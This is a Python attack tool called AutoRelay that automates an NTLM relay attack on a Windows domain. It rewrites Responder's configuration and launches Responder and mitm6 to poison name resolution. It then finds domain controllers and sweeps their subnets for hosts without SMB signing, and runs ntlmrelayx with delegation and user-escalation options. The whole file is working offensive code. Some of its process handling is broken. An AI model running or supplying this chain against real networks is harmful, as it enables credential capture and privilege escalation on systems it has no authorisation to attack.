#!/usr/bin/env python3

import argparse
import sys
import os
import re
import asyncio
import dns.resolver
import ipaddress
import netifaces
import signal
import tempfile
from termcolor import colored
from subprocess import Popen, PIPE, STDOUT
from datetime import datetime
from netaddr import IPNetwork, AddrFormatError
from pathlib import Path

class AutoRelay:
    def __init__(self, domain, interface=None):
        self.domain = domain
        self.interface = interface or self.get_default_interface()
        self.local_ip = self.get_local_ip()
        self.dcs = set()
        self.relay_targets = set()
        self.adcs_targets = set()
        self.webdav_targets = set()
        self.captured_hashes = set()
        self.processes = []
        self.temp_dir = tempfile.mkdtemp()
        self.log_dir = Path('logs')
        self.log_dir.mkdir(exist_ok=True)

    def get_default_interface(self):
        try:
            return netifaces.gateways()['default'][netifaces.AF_INET][1]
        except:
            for iface in netifaces.interfaces():
                if not iface.startswith('lo'):
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        return iface
            return None

    def get_local_ip(self):
        return netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']

    async def run_command(self, cmd, silent=False):
        """Run command with better error handling"""
        if not silent:
            print_info(f"Running command: {cmd}")
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            return stdout.decode(), stderr.decode(), proc.returncode
        except Exception as e:
            print_bad(f"Error running command: {e}")
            return None, str(e), 1

    async def scan_host(self, ip):
        """Scan single host for SMB signing"""
        try:
            # Try multiple methods for scanning
            methods = [
                f"crackmapexec smb {ip} --gen-relay-list {self.temp_dir}/{ip}_relay.txt",
                f"smbclient -L //{ip} -N",
                f"nmap -p445 --script smb-security-mode {ip}"
            ]
            
            for cmd in methods:
                stdout, stderr, code = await self.run_command(cmd, silent=True)
                
                # Check outputs for signs of SMB signing not being required
                if code == 0:
                    if any(x in (stdout or '') for x in ['signing:False', 'message_signing: disabled', 'NOT required']):
                        print_good(f"Found relay target: {ip}")
                        return ip
                    
            return None
        except Exception as e:
            print_bad(f"Error scanning {ip}: {e}")
            return None

    async def start_responder(self):
        """Start Responder with optimal settings"""
        responder_conf = Path('/usr/share/responder/Responder.conf')
        if responder_conf.exists():
            # Disable SMB and HTTP servers for ntlmrelayx
            config_data = responder_conf.read_text()
            config_data = re.sub(r'SMB = On', 'SMB = Off', config_data)
            config_data = re.sub(r'HTTP = On', 'HTTP = Off', config_data)
            responder_conf.write_text(config_data)

        cmd = f"responder -I {self.interface} -wrf"
        stdout, stderr, _ = await self.run_command(cmd)
        if stderr:
            print_bad(f"Responder error: {stderr}")
        else:
            print_good("Responder started successfully")

    async def start_mitm6(self):
        """Start mitm6 with domain targeting"""
        cmd = f"mitm6 -d {self.domain} -i {self.interface} --ignore-nofqdn"
        stdout, stderr, _ = await self.run_command(cmd)
        if stderr:
            print_bad(f"mitm6 error: {stderr}")
        else:
            print_good("mitm6 started successfully")

    async def discover_dcs(self):
        """Find domain controllers using multiple methods"""
        try:
            resolver = dns.resolver.Resolver()
            resolver.lifetime = 3
            
            queries = [
                f'_ldap._tcp.dc._msdcs.{self.domain}',
                f'_kerberos._tcp.dc._msdcs.{self.domain}',
                f'_gc._tcp.{self.domain}'
            ]
            
            for query in queries:
                try:
                    answers = resolver.resolve(query, 'SRV')
                    for answer in answers:
                        dc_hostname = str(answer.target).rstrip('.')
                        try:
                            dc_ips = resolver.resolve(dc_hostname, 'A')
                            for ip in dc_ips:
                                self.dcs.add(str(ip))
                                print_good(f'Found DC: {dc_hostname} ({ip})')
                        except Exception as e:
                            continue
                except Exception:
                    continue

            # Backup method using nmap
            if not self.dcs:
                print_info("Trying nmap for DC discovery...")
                cmd = f"nmap -p389 -sT -Pn --open {self.domain}"
                stdout, _, _ = await self.run_command(cmd)
                if stdout:
                    for line in stdout.splitlines():
                        if "open" in line and "389" in line:
                            ip = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                            if ip:
                                self.dcs.add(ip.group(1))
                                print_good(f'Found potential DC: {ip.group(1)}')

        except Exception as e:
            print_bad(f"Error during DC discovery: {e}")

    async def scan_subnets(self):
        """Scan subnets using multiple threads"""
        subnets = set()
        for dc in self.dcs:
            try:
                ip = ipaddress.ip_address(dc)
                network = ipaddress.ip_network(f'{ip.exploded}/24', strict=False)
                subnets.add(str(network))
                print_good(f'Added subnet: {network}')
            except Exception as e:
                print_bad(f'Error processing subnet: {str(e)}')

        for subnet in subnets:
            print_info(f'Scanning subnet {subnet}')
            tasks = []
            for ip in IPNetwork(subnet):
                if str(ip).endswith('.0') or str(ip).endswith('.255'):
                    continue
                tasks.append(self.scan_host(str(ip)))
                
            if tasks:
                results = await asyncio.gather(*tasks)
                for result in results:
                    if result:
                        self.relay_targets.add(result)

    async def auto_relay(self):
        """Run the full auto relay chain"""
        try:
            print_info("Starting automatic relay attack chain")
            
            # Start core services
            await self.start_responder()
            await self.start_mitm6()
            
            # Discover targets
            await self.discover_dcs()
            if not self.dcs:
                print_bad("No Domain Controllers found")
                return
            
            print_good(f"Found {len(self.dcs)} Domain Controllers")
            
            # Scan for targets
            await self.scan_subnets()
            
            if self.relay_targets:
                print_good(f"Found {len(self.relay_targets)} relay targets")
                
                # Write targets to file
                targets_file = Path(f"{self.temp_dir}/targets.txt")
                targets_file.write_text('\n'.join(self.relay_targets))
                
                # Start ntlmrelayx
                cmd = (f"ntlmrelayx.py -tf {targets_file} --smb2support "
                      f"--delegate-access --escalate-user")
                await self.run_command(cmd)
                
                print_info("Attack chain running. Press Ctrl+C to stop...")
                while True:
                    await asyncio.sleep(1)
            else:
                print_bad("No relay targets found")

        except KeyboardInterrupt:
            print_info("\nReceived interrupt, cleaning up...")
        except Exception as e:
            print_bad(f"Error during attack chain: {e}")
        finally:
            self.cleanup()

    def cleanup(self):
        """Cleanup temporary files and processes"""
        print_info("Cleaning up...")
        for proc in self.processes:
            try:
                proc.terminate()
            except:
                pass
        
        try:
            for f in Path(self.temp_dir).glob('*'):
                f.unlink()
            Path(self.temp_dir).rmdir()
        except:
            pass

def parse_args():
    parser = argparse.ArgumentParser(description='Find and auto-attack SMB relay targets')
    parser.add_argument("-d", "--domain", required=True, help="Domain to attack (e.g. domain.local)")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("--auto", action="store_true", help="Enable automatic attack chain")
    return parser.parse_args()

def print_bad(msg):
    print(colored('[-] ', 'red') + msg)

def print_info(msg):
    print(colored('[*] ', 'blue') + msg)

def print_good(msg):
    print(colored('[+] ', 'green') + msg)

async def main():
    args = parse_args()
    
    if os.geteuid():
        print_bad('Script must be run as root')
        sys.exit(1)

    if args.auto:
        relay = AutoRelay(args.domain, args.interface)
        await relay.auto_relay()
    else:
        print_bad("Please use --auto for automatic attack chain")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print_info("\nExiting...")
    except Exception as e:
        print_bad(f"Fatal error: {e}")
